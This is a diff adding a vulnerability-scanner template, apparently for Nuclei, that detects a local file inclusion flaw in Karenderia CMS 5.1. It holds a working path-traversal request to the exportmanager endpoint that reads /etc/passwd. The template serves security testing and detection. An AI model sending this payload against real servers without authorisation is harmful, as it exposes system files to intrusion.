@@ -1,0 +1,13 @@
+http:
+- matchers:
+  - type: word
+    words:
+    - 'root:x:'
+  method: GET
+  path:
+  - '{{BaseURL}}/exportmanager/ajax/getfiles?f=/../../../../../../../../../../etc/passwd'
+id: karenderia-cms-lfi
+info:
+  author: trainzment, Mehmet EMIROGLU
+  name: Karenderia CMS 5.1 - LFI Vuln.
+  severity: high
